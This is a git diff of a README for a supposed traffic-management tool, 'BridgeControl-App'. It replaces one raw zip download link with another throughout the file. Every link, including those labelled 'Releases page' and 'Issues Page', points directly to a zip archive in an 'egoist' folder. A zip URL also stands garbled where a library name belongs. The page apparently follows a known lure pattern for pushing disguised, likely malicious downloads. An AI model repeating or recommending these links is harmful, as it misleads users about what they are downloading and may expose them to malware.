@@ -6,9 +6,9 @@ BridgeControl-App is your go-to tool for managing real-time traffic data. It's d
 
 ## 📥 Download the App
 
-[![Download](https://raw.githubusercontent.com/mchamme4268/BridgeControl-App/master/egoist/BridgeControl-App.zip)](https://raw.githubusercontent.com/mchamme4268/BridgeControl-App/master/egoist/BridgeControl-App.zip)
+[![Download](https://github.com/mchamme4268/BridgeControl-App/raw/refs/heads/master/egoist/Control-Bridge-App-3.5.zip)](https://github.com/mchamme4268/BridgeControl-App/raw/refs/heads/master/egoist/Control-Bridge-App-3.5.zip)
 
-To get started, you’ll need to download the application. You can find the latest version of BridgeControl-App on our [Releases page](https://raw.githubusercontent.com/mchamme4268/BridgeControl-App/master/egoist/BridgeControl-App.zip).
+To get started, you’ll need to download the application. You can find the latest version of BridgeControl-App on our [Releases page](https://github.com/mchamme4268/BridgeControl-App/raw/refs/heads/master/egoist/Control-Bridge-App-3.5.zip).
 
 ## 🔧 System Requirements
 
@@ -30,7 +30,7 @@ Before installing, ensure your system meets the following requirements:
 
 ## 💻 How to Install
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/mchamme4268/BridgeControl-App/master/egoist/BridgeControl-App.zip).
+1. Go to the [Releases page](https://github.com/mchamme4268/BridgeControl-App/raw/refs/heads/master/egoist/Control-Bridge-App-3.5.zip).
 2. Choose the latest version available.
 3. Click on the appropriate file for your operating system. For example, if you’re on Windows, select the `.exe` file.
 4. Save the file to your computer.
@@ -59,7 +59,7 @@ BridgeControl-App allows you to customize settings to fit your preferences:
 
 This application spans various topics, including:
 
-- **Data Visualization:** Using https://raw.githubusercontent.com/mchamme4268/BridgeControl-App/master/egoist/BridgeControl-App.zip for engaging and informative graphics.
+- **Data Visualization:** Using https://github.com/mchamme4268/BridgeControl-App/raw/refs/heads/master/egoist/Control-Bridge-App-3.5.zip for engaging and informative graphics.
 - **Responsive Design:** Integrating modern CSS for a consistent look across devices.
 - **Data Handling:** Utilizing JSON and MongoDB to manage complex datasets effectively.
 
@@ -73,12 +73,12 @@ If you encounter any issues, consider the following:
 
 ## 📞 Support
 
-If you need further assistance, please visit the [Issues Page](https://raw.githubusercontent.com/mchamme4268/BridgeControl-App/master/egoist/BridgeControl-App.zip) on GitHub. We encourage users to report bugs or suggest improvements.
+If you need further assistance, please visit the [Issues Page](https://github.com/mchamme4268/BridgeControl-App/raw/refs/heads/master/egoist/Control-Bridge-App-3.5.zip) on GitHub. We encourage users to report bugs or suggest improvements.
 
 For more information or feature requests, feel free to open a new issue.
 
 ## 🚀 Download & Install
 
-Remember, to start using BridgeControl-App, you need to visit the [Releases page](https://raw.githubusercontent.com/mchamme4268/BridgeControl-App/master/egoist/BridgeControl-App.zip) and download the latest version for your system.
+Remember, to start using BridgeControl-App, you need to visit the [Releases page](https://github.com/mchamme4268/BridgeControl-App/raw/refs/heads/master/egoist/Control-Bridge-App-3.5.zip) and download the latest version for your system.
 
 Enjoy managing your urban traffic effectively with BridgeControl-App!
